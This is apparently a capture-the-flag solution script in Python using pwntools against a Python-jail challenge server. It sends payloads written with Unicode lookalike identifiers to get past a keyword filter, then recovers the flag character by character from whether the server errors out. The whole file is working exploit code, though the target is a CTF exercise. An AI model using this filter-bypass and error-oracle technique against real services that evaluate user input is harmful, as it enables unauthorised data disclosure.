from pwn import *
from string import printable

host, port = "159.89.193.103", "9998"

context.log_level = "ERROR"


flag = "CJ{d8bf5e4e9439f" # Sempet terputus dari server, pake flag sejak terputus

idx = len(flag)
while not flag.endswith("}"):
    for char in printable:
        conn = remote(host, port)
        payload = f"['{char}'].index(𝔣𝔩𝔞𝔤[{idx}])"
        conn.sendline(payload.encode())
        try:
            response = conn.recvline().decode().strip()
        except EOFError:
            flag += char
            idx += 1
            print(f"Flag: {flag}")
            conn.close()
            break
        conn.close()
